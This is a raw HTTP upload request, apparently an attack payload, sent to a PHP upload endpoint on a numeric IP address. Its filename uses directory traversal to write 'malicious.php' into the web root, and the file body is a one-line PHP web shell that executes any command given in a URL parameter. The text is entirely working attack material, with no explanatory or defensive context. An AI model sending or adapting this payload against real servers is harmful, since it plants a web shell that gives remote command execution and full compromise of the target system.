POST /upload.php HTTP/1.1
Host: 92.51.39.106:8060
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu9A4XMxxtmxZWw7t

Content-Disposition: form-data; name="file"; filename="../../../../../var/www/malicious.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
